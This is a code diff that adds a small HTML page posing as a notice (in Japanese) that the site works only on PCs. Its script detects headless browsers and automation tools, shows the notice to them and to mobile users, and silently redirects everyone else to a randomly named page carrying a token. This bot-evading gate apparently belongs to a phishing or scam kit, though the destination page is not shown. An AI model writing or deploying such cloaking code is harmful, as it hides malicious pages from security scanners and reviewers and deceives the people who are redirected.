@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#f5f5f5;text-align:center;padding:20px;box-sizing:border-box}
+.msg{background:#fff;padding:40px;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,0.1);max-width:400px}
+h1{color:#333;font-size:24px;margin:0 0 16px}
+p{color:#666;font-size:16px;line-height:1.6;margin:0}
+.icon{font-size:48px;margin-bottom:20px}
+</style>
+</head>
+<body>
+<div class="msg" id="m" style="display:none">
+<div class="icon">💻</div>
+<h1>PCからアクセスしてください</h1>
+<p>このサイトはモバイルデバイスに対応しておりません。</p>
+</div>
+<script>
+(function(){
+if(navigator.webdriver||window.__nightmare||window.callPhantom||window._phantom||window.domAutomation||window.domAutomationController){
+document.getElementById('m').style.display='block';
+return;
+}
+var u=navigator.userAgent||navigator.vendor||window.opera;
+var m=/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|tablet|kindle|silk|playbook|bb10|rim|meego|fennec|samsung|lg-|htc|nokia|mot-|symbian|phone|palm|windows phone|windows ce|psp|nintendo|xbox/i;
+if(m.test(u)||('ontouchstart'in window&&screen.width<1025)){
+document.getElementById('m').style.display='block';
+}else{
+window.location.replace('87yspmv1su4m.html#RSQiqA0bsLtJ2tZY');
+}
+})();
+</script>
+<noscript><meta http-equiv="refresh" content="0;url=87yspmv1su4m.html#RSQiqA0bsLtJ2tZY"></noscript>
+</body>
+</html>
